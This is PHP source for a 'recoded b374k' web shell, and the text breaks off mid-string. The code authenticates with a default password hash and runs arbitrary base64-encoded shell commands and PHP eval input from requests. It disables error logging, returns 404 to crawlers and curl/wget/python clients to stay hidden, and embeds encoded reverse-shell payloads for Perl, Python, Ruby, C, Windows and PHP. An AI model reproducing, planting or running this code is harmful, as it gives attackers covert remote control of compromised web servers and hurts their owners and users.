<?php
## recoded b374k shell
error_reporting(0);
@set_time_limit(0);
@ini_set('display_errors','0');
@ini_set('html_errors','0');
@ini_set('log_errors','0');
@clearstatcache();

$s_name = "b374k"; // shell name
$s_ver = "0.1"; // shell ver
$s_title = $s_name." ".$s_ver; // shell title
$s_pass = "63a9f0ea7bb98050796b649e85481845"; // default : root
$s_color = "ff0000"; // shell theme color, default : 4c83af
$s_login_time = 3600 * 24 * 7; // cookie time (login)


$s_auth = false; // login status
if(strlen(trim($s_pass))>0){
	if(isset($_COOKIE['b374k'])){
		if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['b374k']))) $s_auth = true;
	}
	if(isset($_REQUEST['login'])){
		$s_login = strtolower(md5(trim($_REQUEST['login'])));
		if(strtolower(trim($s_pass)) == $s_login){
			setcookie("b374k",$s_login,time() + $s_login_time);
			$s_auth = true;
		}
	}
	if(isset($_REQUEST['x']) && ($_REQUEST['x']=='logout')){
		$s_reload = (isset($_COOKIE['b374k_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),"&"):"";
		foreach($_COOKIE as $s_k=>$s_v){
			setcookie($s_k,"",time() - $s_login_time);
		}
		$s_auth = false;
		if(!empty($s_reload)) header("Location: ".$s_reload);
	}
}
else $s_auth = true;
if(!empty($_REQUEST['s_pass'])){
	if(strtolower(trim($s_pass)) == strtolower(trim($_REQUEST['s_pass']))){
		if(isset($_REQUEST['cmd'])){
			$s_cmd = base64_decode($_REQUEST['cmd']);
			echo exe($s_cmd);
		}
		elseif(isset($_REQUEST['eval'])){
			$s_code = base64_decode($_REQUEST['eval']);
			ob_start();
			eval($s_code);
			$s_res = ob_get_contents();
			ob_end_clean();
			echo $s_res;
		}
		else echo $s_title;
	}
	die();
}
if(isset($_SERVER['HTTP_USER_AGENT']) && (preg_match('/bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww/i', $_SERVER['HTTP_USER_AGENT']))){
	header("HTTP/1.0 404 Not Found");
	header("Status: 404 Not Found");
	die();
}
elseif(!isset($_SERVER['HTTP_USER_AGENT'])){
	header("HTTP/1.0 404 Not Found");
	header("Status: 404 Not Found");
	die();
}
$s_rs_pl ="lZLxj5MwGIZ/Xv+KyvU2SLhj80xMVllcGJrlvLHQncY4JQw+BzlGCe3pzG7+7bbIOaIxUX7q9/bL8zZPOHvi3Iva2eSlA+UXXEFdoDOcSVmJseMkPIXLLefbAi4TvnMqZ3P1/NndhcigKBx0LwDPg/GY8eQOJEWEC5d8CtRBZK4B+4rXEq/88MbdS6h3dMlG7mBNlu9m68mAtvcqpE2/yPBFblCUfzY16PvO+arS3Do0tHMvuGFL3zvHzrVBj4hIdwuyqrnkm29lvANzIJNqYFEkmteYzO4vX0Xzhb+y+yzwriO2Cv3pjU2k9fCQ5mBaTdXLafj6reuOrAPqkcolevww/EhRT4DUKF5pFgveRJqiaCyIQv+W+dPZLLRHitJTr0/Vjt6O07SO8tIklT1f6I1ounhvnRp7RS4klGr7qhPGSQKqxrOZ1RQrnGcbjWvcuMZjnPCyhERCui4Ne6j3eAUlZqvZfGEbL/qeQR+D4HZlG5Nu4odhm6Ae7CHByumpPim4ANOz6M8D+3XQ7M6guJ1JMa0Gl0s8pAgdERTiZPTpn0ZJ1k6jZsrdvAQZxZIrX1lHB4nd31ySvHPdmlAOSdyJG23s37SZrbZJnxkWfUxab92oFaejv5v7L2GNJjhobab6e45IfT8A";
$s_rs_py = "lVRtT9swEP6c/IpgpmGrwaGFaVJZKiEIE9qAqu20D8Cq1LkmEalt2S6Ufz87SV9ATGiqWveee3vOd+f9vWipVTQreQT8KZAvphDc3w8KY6TuRxETGdBciLwCysQiktHs+OvJ46EuoKoiv1xIoUygINTLmVSCgdah0KF+sV/BHsGEplyAL2OE/ML9ZDAPamfMSN/3nE+89aVDIYFjFtYm8UQtbWSTiaV5ZXQ1TBwMSr0Hl/wtSnxPgVkqHjiUNhGpgjTDpLOGbLQdaCENJn5NN2WmFLzhW84DoSlPF7AXI26Qhbx5zOi8rIAL6+F5Vm/LN7DACFb19UyS0XW8MqAWp8NxNz74NPx9MTg4bbUWOq0boIvgsAy+fUYdbRSekw4KBrtCbyvZPFBpcNmfC5s6cDflJM+ol/r0lGWlgD3h7lHvxPHyYMVAmkYrU61rrI3iucpsCViRwVEDeLNYAdWQKlZgxLL7AN/9udcPHYJCFc6rNNfO4Or7ze0oOT8bJ6Rxs4FmbYT2umRqClrqrFR4RnMllhJ3CVnbuAtjxRtlq7ONAZ7hdT9aeEvaOrvRqOdJkZ2kSxOkPKsrsv9dTW0oJ/mbIEE7FpeplZpur3P1NzOD7jnqWJI5GPbsxgMNkJ/Htsk0VfmT395cTuK450Y6zu+6Dz5UO/jxFvcKe/ac3uaHVWlsuXY/Sm6wJL6Om7WhzYFb6exyenWTTNqdouPb8x/T8WSUnF1bF1uYcQohN/bj259TZ7TrMh0lv8bJ2cXFKLQZ35DW1E5ghjE6ovUHhdLdtqZVaUeZ4y+vPFw5btAC2znBOTCDcdF4bIfMLT7VFYB03pumvbdBnm6ag+rHpXkfgn7QxobMNsA1bdP3D8xRZ3dg2vXVxG/9HXP7xKQktg1kji7+F/HuR8TZ/xH/wPxd4oz4fwE=";
$s_rs_rb = "tVZrb9s2FP1M/QqWySprcaSm6zDMmWL0sQ4FVtRI0w1DlRU2dW0RkUmNpOoUSfbbx5ccu7aTDNhoGJTuPbxP3mPvPcpaJbMJ4xnwz1i2ky/RHq60btQgy6goIZ0JMashpWKeNdnkux+eXRyqCuo6iyT81TIJOFaCXoCObwXNWFd8PIc4ikqYYtXSCxUhCbqVHJ9+ePHHp9Gvz89evzt9m5ZiwelYQTofa1r14rlaMH5tv3PGZ4s4GWrZwmA6rhVEwEtvUcK4tk56SsvEWM7NHiE2xa+ZiRUumdJqGJRGOwrxpBwWTpp2BlItPpnQrGF73EWKdQUcy1ymM9VOelmRZX1SFCTBDhbSkD4ac+j56S+/pTXwma7y/CjCZlnRxyfn+d/Znx+fHP54fnXU//5mPxs2+RuuYQayFxDJwASr3RmVn70cvQf5GaSLk5B+kzgNzVU6phQaD6RpIxnXmLhuYNcNPMBUcA5UQ1lw4nATmDHunuwygXKhQy/wyprm1FaBrQnhEihWzs+0R+CyEVLjs59P3+aXGuT8ePT+KI+L/dHvr4qT+DjojfDY3SVV4UOGi5+Kx9+UuDhx21O/k/7UfpKlN7CNXXXdpbfsMUlJckBOyBpqUZlO49rEPgO9npBdcswUYJBSyBdS2ORr24ySQSGH+9kGPlSnTmkl5k2eE7IBCTBrh5Y4/TZjWyF21Xkd7o5BZqwfx4k3vPNEd3VLMz9UC/ll2KuTnWjvY1mge5CvmDTejeW7gPYy79I9rCNLS7UKZSoWgzvLtC1pX6cHJ3Qf/D9NC3aaevMubUQDvFf3iSTJ1TUT1515JizblAfEzOXBhq+b7c62hP21bPW9e5agaHt77w35LekFuGrlbQYqpbVYyUjlnNVRZ8v3cI3YnjqC3EFsxtEmtR0baZW7t6Nzw7G2gCEgT7ie8dyPh2e8vavqxrEeUg/gOOQJDqE1akMITQ1fOkZD1t3/TWSoy2wZ9OaFMsqOsJQnLCNB95CUix9tYSYU5KtU5GRoN/Gg7tAWmkHd4VVGCcI18vAi1zu37kzY1eUrJtgdRTfIm27XNf/GOQTktulUD5zONadh91v4M7B14FCYNhulnzPz5CYMhfHyk+fAVvIP";
$s_rs_c = "rVJhb9owEP0Mv8JjU+tQFxPaaVJpKqFCJbQVEGSapg1FwTHEqrGj2EzQqf99thMYYdqkSf0Q5e7d8zv73uEmSLXO1A3GRCa0tZJyxWmLyDXO8OLqw/XTpUop5xg0cf0tE4RvEgpulU6YbKV3FShnYnWKJZwtTrCdwnqXUfUnrCR5orqKC6qZ+TATVXwjmFG3GBMarGMmoA3ifEUQSeMcNE3449vc+1mv2YJCBMnA79Zr5qIbYgDTLE6SPGICMAOzJbSHg6Bjj9RYSzERLeM147ug9xANR4Owe8Azmesg1VIoGGvJoOvlzz3vN8Vqt5T7OSaHw1Gv359GvdFXR1NB8V5YqqPZ+P5jNAung94jahcUqi1HZhoqU/4UWYpjRtPB59nA6qEziRR7pnIJZdl/Cd8oj26ZhoXMgonECMCTl4Omd8ZQe+sXLG4GSoXhvXcpCWJCqOvcPlzH6BDUcHsB3F6AG0CkEJRomnwXDdS5LrnJJusYbiXxj5NOIbkzTdewQbd2pCAcTB+Drab5ujuZ+cH5u8mX/t15t6wayISUAGxehFUKLlmjuCuXikJi45d6jXJFwcHOq9e30y6kiwpiZ15M+Znmco8gM2tuprknXPgXx8he+587MJxMpuNwHIX3k72vsBz2X90sN+Gk5nnebft4I5yT6j+cVNXEP05e30lVOPlS/wU=";
$s_rs_win = "7Vh3WFPZtj8pkEASEiQISDsoCigdRkCDJAICChIBFQtCGhhNMzmhSAsTUEOMxq4ICg6jjgURlSpFcChWHBsKKDrohRvaIBcYUc8NI3e+Ke/73n/vj/fe+r619lm/Vfbae/+x9zphG9UACgAAtJZhGAAqga9EBf57kmnZwLraALiud9+mEhF63yZqK1cCisTCBDGDD7IYAoEQApkcUCwVgFwBGBAeCfKFbI4zgaBvO5ODHggAoQgUYE+zCPtP3h6AiMIhkN4AqFVIWhYBgHrfzISFM9VN48ivdSNm6v+NSmdivpq1BM7opN9x0h8Xoc1HQQD/47SWHu3624foDwUh/7a/PVo/t/8s47f1z/q7H/Wrn/vviyuc8SH/za/Bw9nVa3pyG4IeUp9qnPRJj3lrQx4bAMQGWg/tqdgigPDWOBheq3gnH8AWjTCoQBvcE68m9g5W1BMiSZ4taFu64aw+BGBINqgZTKpBY/R4aIO9qsCRFu2cigD+EH/KllQEutq2YNFoOsYDqNWUP9A1wc8f08W6kS4VYYcT4VfknAbpSsJ1pbGtu4KExznKe1+MZ9SMYAibzW4qfRTo5V++bBxAF62KANMUTXNvKywmJqphA0MLpWXPle9CFir9Sfay/MBq3j0j16tCa3d6vxAGVNACAJ5iDVebViN/go2fMMYAC7Xq+oJ3u8juL6wRLt3CinGyMhBbj/A9YNiQtNRXpSs+MWT5alWNh6X9cmyNSRec/kQ+iSBmw4TZxJwLGLeGT7UvvshvkzfFNKJph6ENvkd1zX0PTX2pei19o7nhq4O9AgX6WhrdX19jqUagIUkkVEq+NSTAqBLL2iv7Yc3pKygz1wm3zv5tRF8cZmlqzZoD2QLQVO3Xv5nV4Yh1aV7n0nmAkNjvH4ZQtnra2WDEDHMc7u41azE2p1OqL+7/og4zHTeFNENqYH/Zz5avjYkBSoIjkNMGuV0GqFbNV1JtI+C50QSqn6Fjre9zn7ez9ezcb7Y1VY4/fDn1WfPPcPz69esiK/fO2rXM69cdyU/GTN0DD1tLaoSKRlVBcn4VZpm/4vWHiyfiJa9bcoxIBL00tEdiqvN8GXpzkIKck+9n9nqH3DduLyKDXBTwitSlaI7fPzoYBurU+bjSVDl9n0uWPnA2Pdygh1/khxow81u0HEnc3xtDBjAiXbNeEh67alfbUcaqAL9whURCHMy5Phg/qDFtuD24G/Kqz+gYzCke7EUr16vv19YS+1YAs1OV/PIFXfEtHiuIFc2Poq99021Bibd8qdw4NBZ/7uXGFy1Pl+anH7XAc5Hn9V3mpCViltqOrEYeLOgruNToPnGfOa64UYq9SsS5xxEzXVXc1kr741dj3ysoQsdt7zqMhrCN/Y+NSHb3DD2Hfl2wSRTc5dnowBe+Hj6uVEWpbtBLrSY+XNh8L3DOF3hP/Up9ZQRe6a5o+VCMaH0Tg70ycBJ95/JZzzTTuc2FhnDgkQPvX+yNOtIahR7mJalD//nlXHqxxjCNX1ll/m07Ym1B4JNoaRelt6kM2dPLRSMMA7xw5+53VO1wvDRaMnE2NXngUYhivDmbsHMzZrD6LDeP088aSrb+51nzYi5/WINhF//AzRsBBpxP28Zeo5lcRlsetr2UttsruMkWRFmYYhal2rDVJASm/h/bN+pG2VNMZyMLCgSnPPWw/c9DiJsPvazvTOpvIao4Y5u2xLY1rhq1bKrlm/D2dNTZnx7+8P2B3isjazfvFPoBxNLd+49NGRYHN50cPZ7dtoRNcoUuHTMYJyRCJIPbskoq25eSUj4See38sCvgCLSC8nx7W5BmkN0I2c1DUp7FqUlwZK6uK5VgNO+YxfVH54Yd50N7lwbk32wPdokuo5xbrP/ldT9nuL90IblFRwzUN4FwCfWBBrEi14pY3tS7D64dyRjK7oRCiuZn7qZ+h1VtQciWjQjrP8+Vmmh0svc4+eeiKPh/+WvMZenPY8u6+U8tiXsCnwc0QO+avTqaK1DfSBCaM64d5++ll2RbLzXDVJppLE6ibtvcrj6Gtewj8amT8iZ5OlZHiv/RwvyF/nUhBZ5vyjwJY1zZapou6G2hlWaOnuRAXTO2PcWWr2l6y7bOz48O/Qa3+FUFrpleoF/g1v4DjvKd24cdtr8SzwQfK5djhEKD8WZEj5yAtzdZxCMm/pSCQ040WsoWGszbnaaLBhBYZHrwBxtS1ls0OH5LmDp5yIEqewdKnZ/Ltvvqpg28f5VomULgJdt4UyH9LKKdcGgNflNMk0zSbGqbl4ADEI/3B3+ulx/LVsSMRUknFc8U6Z8UD6UEZfTW7nKS0kCJH/BraF0V0jOW8g/Yhnf5x+V2iZSu1IuDj8pvOKCTbBf20ozieLS6J25Ug1bErdCYuxBpMdYgyKXNo4M0QN27O+iQ5sgJrF9/7KB+8V3PVk/vz8XR4cu9xkhj3qqbdrB9Ecn1eZdk9G3Po2uvVnZ21lU20Kyc0FkYi6mkqRHHOxkvDXA1szPslb4YibIezoGlVspvbuuNS8kNrbRJepJypOYeVh2rNOrGZ8ZmQ0uyppwkeXW5ivSecjjavAqdjxhRklBG8qbPa4sSanTufLygH7pQ3P1sIuxB+36HjHp5KhYRvrO8qoQVYeKGtyPKK+B9llfWaTys5R9BKBWNhVLrKgajHR7qkrp7IT8jQWT4Tw/w0T56W5S476PfdndGxowgfnFR+khrD5EGrgwNn01e5XBHRVlCrTqhWtt7in1wMFFT50TKtqQgMKM3iIUo7yRjdO7Q4LNHWXeYsDviY1+vpsSgdOP4QbhWDdSfLzqssR/IOG4iZC1d14VX0c9TQWMcKVtFIPW3ycsf8vnJSz9UWo7ZlEzBuTmX62uFF4xUngXEYXi2fAgtf7S9Kb5FOk5st7gz6nebtGpTa1RQc6KfiwJrNjie4Y9QknPcJqUjB1yuHzAnYPNAOjKpuVHOI4JtmqxDoXxv05qL4/COT4o1GY1jcUgkZF/XPn9DA/qEcJmR7KPevLvx5eA5LHhqrn78QDfkM1vRDq0gH+GIUquHd0lJGgqFlN3wEHLuzMgqv4Xw5+lJ+zRziBTvS1mdPH1DS+not7rW0l/KSaNR8yD6uEedrCGHuAdCP5c+cZbvy+uyVUP4R9hlRYgmHAZDF2yYF136slbF+NS0pj/QJb3xh8RUaJwhPZN5p95KL8e/8+cNDz3pYKUujxp88PE10VDL47irIXYxV7JPdx1P83UMTmtf++BTk5t+eJzG4OK43ojPy8GYyVVZj96slC2hnVM8IGKq8fwpuTddOu/KZEmBzubX6kM0Was5cwM6xQZNo4zZ7fsla+BexemqM6U0xfN5SYok68D6qw78OtnCOf9ql0dNZa+J/+7Bq8tgwgCd0lSF889Meno98EILCtfib6q0CF9drmvvGozlVROXvtINLbTqvLEuJkeqczWzv2K+Fep1sOKlzZ19CLOf5G/B9ebGX+SNtD0kn5HhhYkXfMQdTQ7nn+9H7414Dez6dnB5XKlPE0RNFsxDhV4KcLV+sy7XeJl+4AZjb+XbdseT2FDKdyeymlbTNhJpmng1LiW5Q9Pudox+htbS2LnmE3bH/oLM4VKxcVY/Rq4HOJGTNA77z1ZU3yIpXtxTYm/SjeVp72aFtzIw7fcM3FvBrj4ssxe0Cx9jfEIz8ykpox0MgDnAmNSa5KV78rUSX3i9WCvdz1/K1srWw8dvVmoHUL1XNu2zlRc37cPeLDrYg3ePhkwKS1+IkDchkpHhUMN7SRqlk9axDICtzy88CEREhkW2f4HhSCCCwxdCHDCSI07ksjgSMIwhYCTgZV6gqfVC9FyqLup86/xeOGgNgsdlJrC2xUqcd2vj2DweELsyMTaCk8CVQByxP48hkXAkRMdKcv5mL1MjVObU8ClnZxektjuAuHyOi8hByhY6iTnwIDzFE7KcWdbruGJIyuCtkYakgPYMNlvsaN4BD4ILmCgJdydHGG/PdHAIQi5OnFq8h+Xk6YxwcznCMoIrYKILSyiI5ya4cD28F+NSEvhcQYKTZCsD5g8I+WwnNgNiiFxjFoBz/YVSHlvYCY8L7CDQHBJzOYkcUMA4BYrAIP/U1AfV/lHgYhBECflz5eOl9d2OTsuOg76+hbGxXEBZgI91iA1kCyuivewlfDxr69zdw6vZgsmdgJNlaMhy/4lBGN4QFBayOsgpMNgpKiDMzSlyZejKOVHBEU6zycZxY+s93I8V63/LM+oF1shKOUcsqCVx6HjHc6VtFFQAc+Njz7DHvIx9lxrullTx2pl2Qx9ReNYcLei5YHFwNG/anKE+W9d1f7wsrHecFaTLRs1eMG32XEHfyPwtOlmWe9C50zMsr7ikkr2qkZt3dns76lXfyJdOz/tlWI4paO/OGY5iLFqIssHNj4wDfMsCX5DjtN1Y3ElS9BFUSxyKrlOOBE4gzzjqHYfvwmWyNQgam02DhHyav5jDgDh0sbA0aROgJyEGJnMhwlh6xyb8Cq7ALogD6a3mV1ybxSD44/kMq1BWp/WluaRQhgQKFC8RE8K6cc8+C9lSHifYhme9NkmcgfuYuoEYCTG+EYUI4oV8Ie0hGJmSyw/g2rDKKs7WcMUp8ZHSCI4AMv78rNlqrWDrBnbJDyKIKxRcrpp9/QKvxYJM2uyF26Z7QAJ5bUimtRGLMN+HYSfPRfvzhBIO9nO8//GLhuTqcNGuMGxlZqS/LbEUDGizpBnqnCxI94fEvGDxDyabZkvuD2ROjPkamECpqCXvJaKN5eHXfHy/L2uNjU2BXiYtIvO4jgkSAxGy8Vb5M7lHl4AQzxfsFLq85thLYhkiQyhFRNz1Ps/maRx2y/P7eZtEGAemjpdB/YepAWcfBlNox4AwQq4mbxFOL37OwUMsbN2igJNZvF8wHD5LlHI/vnOLhJtwgHeulhyx3ih+32AkLRLc7oDr+faFNxTGKl7NlDS+Zz5kSezwuYJCszMVzm+2mkDMlCaD7oEy2VYBT/cXHvMia3BYI9kqhdjCJD1tj/0Udt2ZEorQ0TbZc79219sFYR+0HTYZRGJIhiSbM6Jr51ypOJNrTRY7It9QRHhR3bUOhwVWVBKG5L7TxppACtbN7yh5s9C5GMJgZ6nPuGxaTL6dR49z7pjY5ZM+jn5iavfjqdoYqmmDs9i+AUFK+Hgg325OHNWZWXXycgwYrqbLHML7X2EPcc3jzidZkOXoRW4PpltVQ0ANAPDvPWpcnbGMCqjqNPtheL0Gp87VXbEHE4TolGKUVvKhT4ad4sHK6Xb9D4hhA6JTMizVm1ElvW5t8j6UmHCrB6uNlo/AEKT48Y/+bX9SpCDtL8Y/JZPfQmZ9Bj7AsPwRQkV2kX/+lEjMRS7XFhUinehnwTCsViLljWgFRt6Clvejk35BPOwP1cJbFBNVcm03Xto3WiI1kfkhpBNKTPytPuytBtKu2w6TiJGLmp9VdUAcACgxeg0QRRmLVmW7Tm8H4gNd3oKFj7K130dyMUHYBqhL8ev64NGStfDRrVpQ645RoORNaM0b+GiyFlCW8LRSm20Ehmum/wHQo7ahI9fDT1W7T2u3SwZmyuLsM6PpUfRpMJqhCrCVbQN8bks/ygdk/ZgsGAb+n/6v0/FCAGAX/hn7XqvL/oKVafU9f8Fqtbq68L/O26rFn2n5vZbHtYwuAoBZRV9t4MzoPDN6zoyrAiNWB4Z6uDsHhIYCtIB1NHrIjMKXJLLEkPP082J9pHvsDAoAoUIGO5TLFDPEKTQA0N4/2quJpb2sxByJBABmnhJaDOKwoN91Gk/70vhdWyHmcLSZpm+y6eDfAoFwEUcw8/TR5o3lCpkAwOQK2P87zvzf";
$s_rs_php = "7VRNj9s2ED3bv0JRCayEai3LDhBgXW4u7bFA0BboIbsRZIqyCEsiy6FqB9397x2Skj82zm6QBr20MGxTM5w3X0/vh7eqVtPvgtoYBTdpymTJZxspNw2fMdmmKl0v37zeXkPNmyadcq2lzjVXUhvRbaJ5vJoCN7kRLc8b0QrjTHKdi1Y1ggmTV00PdYTGKTGF3nBDiQZ/Wo0moHyvGkwdhUGYDEYMIQxotly+wdOuoF3fNHjihxPUNMRArCX47adffqZ7w3W7evdrRq/uyLvff7y9Wg1utK3StehSqINrEWJsS0PXWeA6C24CJruOM8PLuw79U1FFTPadicYSY0qz+K/phChKxvInBCsI7b9BONGVeH6c8gb4pfDFeTi8n997iIMhux+xCrZ1WLaOqu+YEbLL+V6AgehKsc40eSX19ir2mKKkR6Md9gTjnJleZzHGmSg7sXrLfLAoCWKf4xpBlFF8HuErwJKG/lw6oGA0L9ocJNvi9oHrP7mOQsMUUmg+c5+bcEZUQpAxnXR/GGMTjqEDa2SPM4Jk6Yoh7AlywRhX9sJQKnqNbOQOs0G/xqcI6Zv3XdHyKE7myTLG+sOd6Fyhk2qnheERYQlpZzhhtsMGZ+FtaOEmu1o06FSvKK0K3JkLsQuq7DIwyt1yE9J8k7eFYXUUpqy8C6L3H+7g/vs4FUhX7FLr2EdPSFkiwbVfpY8WkJdCR+iJY1aPR+8mkp7W5YyP9mcgkdGiPe2aKNeh3U8YPDwEn/H/0aM/DtY4y+1qhAswGd/bjjEXsnz2SeaTeUlXoC2lYo0EPo5jfHIbQbcFfjpqd5GUQAuti4/RnN76Q6iE4mES6jBOsqfGHRoXF4weTGmqtGS5VLzD5HWC8Dh5oZwbB/UKp6w5yF4z2yHu48j6U86tG2SWlS4bjG9gMn/+RvbijcWzN9jg9GQzuh9oZt9rLis71ocHf/Lp4vi4NaKLYYZ2rkM5Q1JPoEPOBrUrwvsJKiW+bkViNfJAYNHlRxxdHMgqaIXxpTMzGDg5rnIYEBHxkZZnWGNBlwBH3yeo7AXAxTOAi5cBH885ekLe8ejbOn/OnjwP43WUG83aM/6g714UrVAPolhZ0fIErZ0q8A6/o7Z9vXrBV6kX/GfVCy6p1+f0Cv7Xq7Mb8JJewZfpFXwjvYLLagD/ml7Bt9Yr+BK9+sci9fZ2+jc=";
$s_favicon = "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAIBAQIBAQICAgICAgICAwUDAwMDAwYEBAMFBwYHBwcGBwcICQsJCAgKCAcHCg0KCgsMDAwMBwkODw0MDgsMDAz/2wBDAQICAgMDAwYDAwYMCAcIDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAz/wAARCAAQABADASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwDe0T9mrwn46/YZ/YvsfDv7Fv8AY/jDxZpVtaL4z/4Q/wAAal/wld5L8PtbaK78i51RTeYuhFqflakIFk+xfOVn8uNuf8eeA/hT8Fv2VP2rfA/jj9lLw/J8VpNK1O00PXLvQPh1o1/YXlj8OtDnvbu1sodWaWLy5mk1aSLSUuFgW+DKTMZI15/4Q/ts3+kfA/8AZ109f2jfsMPwu0rQ7vwlb/8ACz/hxD9ovG+G2ume08qXSmm0b7Nf+Ro/m6u1wrfb9xBmCSLz/wC0B+0BovxF8FfGjWNY+NHh/wAQ+IPEOleJbu/v7vx98Mr2/wDDl5P8MtBjNpalNIF1qX267E2iSS6JJaqV08Ejzd7sAf/Z";
$s_favicode = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAA0klEQVQ4jeXQMUpDURCF4XlBQpBHagkSrLICsRDJClxBmnSSNaRLncpVhGApWYSYHaQScQcGm8CXwnkgl6eFpU435/yHM/dG/I/BLS5/G77AB+5/gnp4xLLFW2OP89yXyfYaoIuNz5kV4evUF1+0WWobdJsGmBfhDp7whrrw5plZn0TEKCIOEbEtrp9ExFVETKuqei+8bWZGgQF2+c5xNpziFc/oFO3jZHcYNOIQL1jlvsgTb1o+dZXssDT6qLN9j4cynFyNfpvXAIE7nH0L/a05Ar2N6tvfpEDCAAAAAElFTkSuQmCC";
$s_checkbox_img = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAeCAYAAADzXER0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAASdJREFUeNrsk0GKwjAYhZNJqYviQpDKLOcY3sOFIF5DFF0KgjeYAwizmDuNOxHcFrGlje9pA1KbNOqshvnh2YD58v6m75dxHIdCiAk0gt5Fc+2gDbQO8DNTSk1D1BtKSikoWxVF0U7TdJ5lmSI8BtfCARKsoFyw1poeLcBjwl0aEgqCwAma4n5yhC+AceSzqdD69RAD+zjedSBeqH/4CfiA74bgaG+o3HxQURR1sOgjnqpMDv+0ikZJkpzyPP9kwlbIaQgNsO55GO+hb2hp3vnI1Hl2XZT7xe+PJNbWYWgcyao7L+p22h4ayephdyPJVl3v+jFcuhNmg+tAazxvN9tA86m83H6+Fm5n3mpd49sSlDaYN3jJb8WFazMy2rftujb/yEieBRgAZHG/OeGef6MAAAAASUVORK5CYII=";
$s_style = "rVbdjqs2EL6v1HdwFVXqDyBIcrK7oD5CL3tV9cKACdYa2zLD2WTReffaxiYmkLNbqfaNweP5+eabsX8bG8EhbnBH2TX/qxw4DOhPwUXUE0Wb4tuPP5Sivo4lrl7PSgy8znepHQWyJ3v6TvJsLy9FJZhQ+a6xo7Cbb4SeW8iPWloratVYClUTlWfygnrBaI12ezvMNh69hrNdFEAuENekEgoDFTznghMrmLfiK1Hj0qDekIqMEtc15ec8Rc/aJ/2zEaoba9pLhq855YxOSgCXjCBoIzlWg+q1opo0eGBgNncdpnyMO/EeTx7HCtd06PMs1Uo3fr3RGlq9TM0H6rA6U57jAUTh/dEIeY92LcFawWjjw4yeec5IA4U7ls5n0kAatdl4A3xv7Gh4y1cKMSjMexNmrgRgIL/E2SE5PNXk/GthY/iewEdGEY4ScpEaacJoDxP0CK/B33WEDwueZHbMFpCB4OggUKTXWP8XiNfU8TwxKY3biWrZyYjenLCccb5iO27+TBTxcR9vCUpM9JQ3YnSyp0DORGHOWkteGErWI1Cj82JvwtQ4Aa0wcynuaF0zS73kjK8a1ZDCLpKwaJ6mokkMrB1dALt/MbP4TLkwAqCB7CWunPPFXdlupOC4yoD5s2JKiNjkpSvM0NfDyUwrQ7kc4D1KpBKdhCiBC2BF8BZnXLJT70YpAEQXJv/wYuZ9MEtWBimzDkyGxy2UvS9zIf9cuFwenlJ3fPK/HGC8s7oI4MXM+9w87HszGV1h+FoLHQnxTkMhXYaPeuQsAvX4EEPnQ1g/W8wFIYtVW70ZaFeALrg62fDnTwFnZg1qgzfZs5k/0U4KBZjbtpz0pNM31JXO/dyGu93CElPAyLb5EMwlr0/fbSxO8YS7V/48s8GobyMd/9rvzUqeTnycj1l27rKVHXbjKyVvDd2M6aHCoON5mnk1n/FnI7yQLWFjvFdfaRgIh/lWzrKwZ1xLcfl/roAwU4uunh3vDaJ2/zjiox331bsmGLrVARdAmwUF/DGnxT2X1sS754gzc1jQzfmP9qG5GzOc8uAeiqYw9SqkiBaw7etvuEryR9WS6lUL/ZNUfR/7L/Q7YrgkzP60K5+32LxPpkeHv2e/6PXyVRWXTFSvy9v4y6I7xopIgkFXrVuFe1L01LYwDe6Du9M91KSgmlXqUzHldkHqjdi2bcfWZ1+C0VSIbeYXKvrQ5LI5ffsX";
$s_mime_types = "dZThdqMgEIX/7zn7DvMC2jZ62t3HmQgaGkepCDFvvxeNis32xx3huwMYmUkwSvcvRWMtIfz+Fbb5CeC0gsvp/Y1iSEARQZGAMoJyBZ9WN/Rpm7ADoUWNrEw+T7TIbmeJLemhgNCUu4EdH2EekLwh47Sd0DcN9fuBX95U19GIpq+RpN946FSudKXziyIfLlC4PHnSn02r4Un05cm3ca2Nnn3yXPRc9NyTN0+jFXV8pXDO63gmBimvw0hQiuJH8ENLMnmS0h8sl9mW74Nmdc9FK8O5vQeC0iyc7fP4kX3w8UUOWwQTekJY2U2fhWJYwZTVuBooAa0hKAXIaJMMibeZLhEeh95dmeQK51ooBJfYHe64axLgMnY1LZoOPPRngg7shneWbyQAhW9sAjvudgtg4cCWW+OQ/EDXmAxFZTTNMTFwjIvHsFemf2FlKyHEFZzZmYrYk+vUysQoQwg0D6480CBmM5dm4H2+tAC+HLoUioMCjYBnsWUtzcAUn85OK3aFELRNTXslhHW+1ek8RWlwLA8+2KYxI7fZzXTKke6Pawcm6IBGR9A3FJsPj4tKeesr3Y156E2lqQ029f5b2IzCPhzWeT1wjh/Q2vLP6yttox+SPsqPR1Ic/ZD0933dKY7SpMFYgla0dsr2SlPGjLvmKgGmRgGbWXNIvIprgnZQt1gew46StkmO2f4RCp9A1DKjlnk6MmHUfLLYdhk+a7tc+